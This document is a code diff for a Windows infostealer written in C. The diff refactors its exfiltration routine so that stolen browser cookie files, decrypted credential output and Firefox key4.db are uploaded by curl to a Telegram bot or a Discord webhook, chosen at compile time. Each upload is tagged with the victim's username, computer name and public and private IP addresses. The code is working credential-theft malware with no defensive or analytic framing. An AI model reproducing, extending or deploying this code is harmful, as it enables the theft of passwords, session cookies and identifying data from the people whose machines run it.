@@ -33,12 +33,33 @@
 // we'll use the command-line approach: copy the DB, read it raw
 // Actually, Chrome locks the DB. So we copy it first, then parse.
 
-// Telegram config
-#define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
-#define CHAT_ID "YOUR_CHAT_ID_HERE"
+// ══════════════════════════════════════════════════
+// EXFIL CONFIG — Set via compiler flags:
+//
+// Telegram:  cl ... /DUSE_TELEGRAM /DTG_TOKEN="bot_token" /DTG_CHAT="chat_id"
+// Discord:   cl ... /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
+// ══════════════════════════════════════════════════
+
+#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
+#define USE_TELEGRAM
+#endif
+
+#ifndef TG_TOKEN
+#define TG_TOKEN "YOUR_BOT_TOKEN"
+#endif
+
+#ifndef TG_CHAT
+#define TG_CHAT "YOUR_CHAT_ID"
+#endif
+
+#ifndef DC_WEBHOOK
+#define DC_WEBHOOK ""
+#endif
+
+// ══════════════════════════════════════════════════
 
 // Forward declarations
-void send_telegram(const char *filepath);
+void send_file(const char *filepath);
 
 // DPAPI decrypt
 int dpapi_decrypt(const unsigned char *in, int in_len, unsigned char **out, int *out_len) {
@@ -383,66 +404,83 @@ void send_cookie_files(const char *tempPath) {
             char renamed[MAX_PATH];
             snprintf(renamed, MAX_PATH, "%scookies_%s.txt", tempPath, browsers[i]);
             MoveFileA(path, renamed);
-            send_telegram(renamed);
+            send_file(renamed);
             DeleteFileA(renamed);
         }
     }
 }
 
-// Get public IP via ipinfo.io (cached for multiple sends)
-static char g_public_ip[64] = {0};
-static char g_private_ip[64] = {0};
-static char g_comp_name[256] = {0};
-static char g_user_name[256] = {0};
+// Machine info (cached)
+static char g_info_caption[512] = {0};
 
-void init_machine_info() {
-    if (g_comp_name[0] == 0) {
-        DWORD s = sizeof(g_comp_name);
-        GetComputerNameA(g_comp_name, &s);
-        s = sizeof(g_user_name);
-        GetUserNameA(g_user_name, &s);
+void init_info() {
+    if (g_info_caption[0] != 0) return;
 
-        // Get public IP
-        system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
-        char ip_file[MAX_PATH];
-        GetTempPathA(MAX_PATH, ip_file);
-        strcat(ip_file, "ip.txt");
-        FILE *f = fopen(ip_file, "r");
-        if (f) {
-            fgets(g_public_ip, sizeof(g_public_ip), f);
-            char *nl = strchr(g_public_ip, '\n'); if (nl) *nl = 0;
-            nl = strchr(g_public_ip, '\r'); if (nl) *nl = 0;
-            fclose(f);
-            DeleteFileA(ip_file);
+    char compName[256], userName[256], pubIP[64] = {0}, privIP[64] = {0};
+    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
+    GetComputerNameA(compName, &s1);
+    GetUserNameA(userName, &s2);
+
+    // Public IP
+    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    char ipf[MAX_PATH];
+    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
+    FILE *f = fopen(ipf, "r");
+    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
+    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
+    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;
+
+    // Private IP
+    char pf[MAX_PATH];
+    snprintf(pf, MAX_PATH, "%spriv.txt", tmp);
+    system("ipconfig | findstr /i \"IPv4\" > %temp%\\priv.txt 2>nul");
+    f = fopen(pf, "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            char *colon = strchr(line, ':');
+            if (colon) {
+                colon++;
+                while (*colon == ' ') colon++;
+                nl = strchr(colon, '\r'); if (nl) *nl = 0;
+                nl = strchr(colon, '\n'); if (nl) *nl = 0;
+                strncpy(privIP, colon, sizeof(privIP)-1);
+                break;
+            }
         }
-        if (g_public_ip[0] == 0) strcpy(g_public_ip, "unknown");
-
-        // Get private IP
-        system("powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object -First 1).IPAddress\" > %temp%\\priv.txt 2>nul");
-        char priv_file[MAX_PATH];
-        GetTempPathA(MAX_PATH, priv_file);
-        strcat(priv_file, "priv.txt");
-        f = fopen(priv_file, "r");
-        if (f) {
-            fgets(g_private_ip, sizeof(g_private_ip), f);
-            char *nl2 = strchr(g_private_ip, '\n'); if (nl2) *nl2 = 0;
-            nl2 = strchr(g_private_ip, '\r'); if (nl2) *nl2 = 0;
-            fclose(f);
-            DeleteFileA(priv_file);
-        }
-        if (g_private_ip[0] == 0) strcpy(g_private_ip, "unknown");
+        fclose(f);
+        DeleteFileA(pf);
     }
+
+    snprintf(g_info_caption, sizeof(g_info_caption),
+        "%s@%s [pub:%s priv:%s]", userName, compName, pubIP, privIP);
 }
 
-void send_telegram(const char *filepath) {
-    init_machine_info();
+void send_file(const char *filepath) {
+    init_info();
     char cmd[2048];
+
+#ifdef USE_TELEGRAM
     snprintf(cmd, sizeof(cmd),
-        "C:\\Windows\\System32\\curl.exe -s -F \"chat_id=" CHAT_ID "\" "
+        "C:\\Windows\\System32\\curl.exe -s "
+        "-F \"chat_id=" TG_CHAT "\" "
         "-F \"document=@%s\" "
-        "-F \"caption=%s@%s [pub:%s priv:%s]\" "
-        "\"https://api.telegram.org/bot" BOT_TOKEN "/sendDocument\" >nul 2>nul",
-        filepath, g_user_name, g_comp_name, g_public_ip, g_private_ip);
+        "-F \"caption=%s\" "
+        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
+        filepath, g_info_caption);
+#endif
+
+#ifdef USE_DISCORD
+    snprintf(cmd, sizeof(cmd),
+        "C:\\Windows\\System32\\curl.exe -s "
+        "-F \"file=@%s\" "
+        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
+        "\"" DC_WEBHOOK "\" >nul 2>nul",
+        filepath, g_info_caption);
+#endif
+
     system(cmd);
 }
 
@@ -628,7 +666,7 @@ int main() {
     fclose(fp);
 
     // Send to Telegram
-    send_telegram(outFile);
+    send_file(outFile);
 
     // Send cookie database files
     send_cookie_files(tempPath);
@@ -637,7 +675,7 @@ int main() {
     char ff_key4[MAX_PATH];
     snprintf(ff_key4, MAX_PATH, "%sff_key4.db", tempPath);
     if (GetFileAttributesA(ff_key4) != INVALID_FILE_ATTRIBUTES) {
-        send_telegram(ff_key4);
+        send_file(ff_key4);
         DeleteFileA(ff_key4);
     }
 
